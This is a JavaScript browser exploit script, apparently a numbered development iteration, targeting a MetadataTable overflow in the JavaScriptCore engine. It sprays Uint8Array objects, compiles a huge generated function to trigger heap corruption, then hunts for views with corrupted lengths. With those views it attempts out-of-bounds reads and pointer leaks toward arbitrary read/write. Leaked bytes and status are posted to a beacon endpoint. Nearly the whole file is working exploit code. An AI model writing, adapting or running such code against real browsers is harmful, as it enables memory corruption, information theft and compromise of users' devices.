// p370 - MetadataTable overflow targeting TypedArray JSCell headers
//
// PIVOT from p317b: instead of spraying ArrayBuffer backing stores (marge bitfit,
// isolated pages, proven DEAD), spray Uint8Array CELLS in MarkedSpace (same tier
// as JSStrings that p146/p148 proved get corrupted by the sweep).
//
// The sweep writes at stride 112 from MetadataTable base:
//   entry+12: m_slowPathCount = 0xFFFFFFFF
//   entry+24: m_slowPathCallDestination = thunk pointer (code addr)
//   entry+64: bit fields
//   entry+68: m_bytecodeIndex = sequential index
//
// JSArrayBufferView layout:
//   +0x00: JSCell header (StructureID + flags, 8B)
//   +0x08: Butterfly* (8B)
//   +0x10: m_vector (8B) -- THE ARW TARGET
//   +0x18: m_length (8B)
//   +0x20: m_mode + more
//
// If sweep entry aligns so entry+24 hits cell+0x18: m_length gets thunk pointer
//   -> TypedArray thinks it has huge length -> OOB read/write
// If entry+12 hits cell+0x18: m_length gets 0xFFFFFFFF -> 4GB OOB window
// If entry+24 hits cell+0x10: m_vector gets thunk pointer -> reads from code
//
// Detection: check .length of each sprayed Uint8Array after compile.
// Any Uint8Array where .length != original value was corrupted.
//
// Beacon prefix: V370-

(function() {
  var BQ = 0;
  function B(tag, body) {
    try {
      var u = '/beacon/V370-' + tag + '?t=' + Date.now() + '&q=' + (BQ++);
      if (body !== undefined && String(body).length < 2000) {
        var x = new XMLHttpRequest();
        x.open('POST', u, true);
        x.send(String(body));
      } else {
        new Image().src = u;
      }
    } catch(e) {
      try { new Image().src = '/beacon/V370-ERR-' + tag.substring(0,30); } catch(e2) {}
    }
  }

  B('BOOT');

  // Phase 1: Spray TypedArray CELLS in MarkedSpace
  // Use Uint8Array with small backing buffers (256 bytes each)
  // The cells themselves are in MarkedSpace blocks (~16KB aligned)
  // The backing buffers are separate (FastMalloc) -- we don't care about those
  var SPRAY_COUNT = 8000;
  var BUF_SIZE = 256;
  var MARKER = 0xBE;
  var views = new Array(SPRAY_COUNT);
  var sprayOK = 0;

  for (var i = 0; i < SPRAY_COUNT; i++) {
    try {
      var buf = new ArrayBuffer(BUF_SIZE);
      views[i] = new Uint8Array(buf);
      // Fill with marker so we can detect data corruption too
      for (var j = 0; j < BUF_SIZE; j++) views[i][j] = MARKER;
      sprayOK++;
    } catch(e) { break; }
  }
  B('SPRAY-' + sprayOK);

  // Phase 2: GC to settle allocations
  var gcP = [];
  for (var i = 0; i < 40; i++) gcP.push(new ArrayBuffer(65536));
  gcP = null;
  for (var i = 0; i < 20000; i++) var _gc = {a: i};

  setTimeout(function() {
    B('GC-DONE');

    // Phase 3: Compile the 38M function -> MetadataTable overflow
    // finishCreation sweeps 4.29GB forward, hitting MarkedSpace blocks
    var N = 38348816;
    var CHUNK = 4000000;
    var nChunks = Math.floor(N / CHUNK);
    var rem = N - nChunks * CHUNK;

    var callChunk = 'a();'.repeat(CHUNK);
    var parts = new Array(nChunks + 3);
    parts[0] = 'window.__p370fn=function(a){';
    for (var c = 0; c < nChunks; c++) parts[1 + c] = callChunk;
    parts[nChunks + 1] = 'a();'.repeat(rem);
    parts[nChunks + 2] = '};window.__p370scan();';
    callChunk = null;

    var blob = new Blob(parts, {type: 'application/javascript'});
    B('BLOB-' + Math.round(blob.size / 1048576) + 'MB');
    parts = null;

    window.__p370scan = function() {
      B('COMPILED-OK');

      // Phase 4: Scan all sprayed TypedArrays for corruption
      var lenCorrupt = 0;
      var dataCorrupt = 0;
      var detached = 0;
      var firstLenIdx = -1;
      var firstDataIdx = -1;
      var leaks = [];

      for (var i = 0; i < SPRAY_COUNT; i++) {
        if (!views[i]) continue;

        var v = views[i];
        var corrupted = false;

        // Check 1: length corruption
        // If m_length was overwritten by sweep, .length will be wrong
        try {
          var len = v.length;
          if (len !== BUF_SIZE) {
            corrupted = true;
            lenCorrupt++;
            if (firstLenIdx < 0) firstLenIdx = i;

            if (leaks.length < 10) {
              // Report the corrupted length value
              // If it's 0xFFFFFFFF (4294967295), m_slowPathCount hit m_length
              // If it's a pointer-like value, thunk address hit m_length
              leaks.push('L' + i + '-' + len);

              // Try to detect what kind of corruption
              if (len === 4294967295 || len === 0xFFFFFFFF) {
                leaks.push('L' + i + '-FFFFFFFF');
              } else if (len > 0x100000000 || (len > 0x7F000000 && len < 0x100000000)) {
                leaks.push('L' + i + '-BIGLEN-' + len.toString(16));
              } else if (len > BUF_SIZE && len < 0x10000) {
                leaks.push('L' + i + '-SMALL-' + len);
              }
            }

            // If length is very large, try OOB read as info leak
            if (len > BUF_SIZE && len < 0x100000) {
              try {
                // Read beyond original buffer
                var oobBytes = [];
                for (var k = BUF_SIZE; k < Math.min(BUF_SIZE + 64, len); k++) {
                  oobBytes.push(v[k]);
                }
                if (oobBytes.length > 0) {
                  var hex = '';
                  for (var k = 0; k < oobBytes.length; k++) {
                    hex += (oobBytes[k] < 16 ? '0' : '') + oobBytes[k].toString(16);
                  }
                  leaks.push('OOB' + i + '-' + hex.substring(0, 128));
                }
              } catch(e) {
                leaks.push('OOB' + i + '-ERR');
              }
            }
          }
        } catch(e) {
          detached++;
          continue;
        }

        // Check 2: data corruption (sweep wrote into backing store area)
        // Less likely since backing stores are separate, but check anyway
        if (!corrupted) {
          try {
            var anyBad = false;
            for (var j = 0; j < Math.min(BUF_SIZE, 32); j++) {
              if (v[j] !== MARKER) { anyBad = true; break; }
            }
            if (anyBad) {
              dataCorrupt++;
              if (firstDataIdx < 0) firstDataIdx = i;
              if (leaks.length < 10) {
                var hex = '';
                for (var j = 0; j < Math.min(BUF_SIZE, 32); j++) {
                  hex += (v[j] < 16 ? '0' : '') + v[j].toString(16);
                }
                leaks.push('D' + i + '-' + hex);
              }
            }
          } catch(e) {}
        }
      }

      B('RESULT-len' + lenCorrupt + '-data' + dataCorrupt + '-det' + detached + '-first' + firstLenIdx);

      for (var i = 0; i < leaks.length; i++) {
        B('LEAK-' + i + '-' + leaks[i]);
      }

      // Phase 5: If we found a corrupted TypedArray with large length, try ARW
      if (lenCorrupt > 0 && firstLenIdx >= 0) {
        B('ARW-ATTEMPT');
        var cv = views[firstLenIdx];
        try {
          var cLen = cv.length;
          B('ARW-LEN-' + cLen);

          if (cLen > BUF_SIZE) {
            // We have OOB access! Read nearby memory
            // Read 256 bytes starting at the original boundary
            var dump = '';
            var readable = 0;
            for (var k = BUF_SIZE; k < Math.min(BUF_SIZE + 256, cLen); k++) {
              try {
                var b = cv[k];
                dump += (b < 16 ? '0' : '') + b.toString(16);
                readable++;
              } catch(e) { break; }
            }
            B('ARW-READ-' + readable + '-' + dump.substring(0, 200));

            // Try to detect pointer-like values in the OOB region
            // Look for 8-byte aligned values that look like heap pointers
            if (readable >= 8) {
              for (var off = 0; off < readable - 7; off += 8) {
                var lo = cv[BUF_SIZE + off] | (cv[BUF_SIZE + off + 1] << 8) |
                         (cv[BUF_SIZE + off + 2] << 16) | ((cv[BUF_SIZE + off + 3] << 24) >>> 0);
                var hi = cv[BUF_SIZE + off + 4] | (cv[BUF_SIZE + off + 5] << 8) |
                         (cv[BUF_SIZE + off + 6] << 16) | ((cv[BUF_SIZE + off + 7] << 24) >>> 0);
                // Check if it looks like a pointer (high bytes nonzero, aligned)
                if (hi > 0 && hi < 0x10000 && (lo & 7) === 0) {
                  var ptr = '';
                  for (var b = 7; b >= 0; b--) {
                    var byte = cv[BUF_SIZE + off + b];
                    ptr += (byte < 16 ? '0' : '') + byte.toString(16);
                  }
                  B('PTR-OFF' + off + '-' + ptr);
                }
              }
            }
          }
        } catch(e) {
          B('ARW-ERR-' + String(e).substring(0, 40));
        }
      }

      // Phase 6: If no length corruption, check if any views were detached
      // (sweep corrupted the cell so badly the buffer appears detached)
      if (lenCorrupt === 0 && detached > 0) {
        B('DETACHED-' + detached);
      }

      // Diagnostic: if nothing corrupted, report allocation stats
      if (lenCorrupt === 0 && dataCorrupt === 0 && detached === 0) {
        B('NOCORRUPT');
        // Check if views are still alive and readable
        var alive = 0;
        for (var i = 0; i < Math.min(100, SPRAY_COUNT); i++) {
          try {
            if (views[i] && views[i].length === BUF_SIZE) alive++;
          } catch(e) {}
        }
        B('ALIVE-' + alive + '-of-100');
      }

      B('DONE');
    };

    var url = URL.createObjectURL(blob);
    var sc = document.createElement('script');
    sc.onerror = function() { B('SCRIPT-ERR'); };
    document.head.appendChild(sc);
    sc.src = url;

    setTimeout(function() {
      if (!window.__p370fn) B('TIMEOUT-NO-COMPILE');
    }, 120000);
  }, 2000);
})();
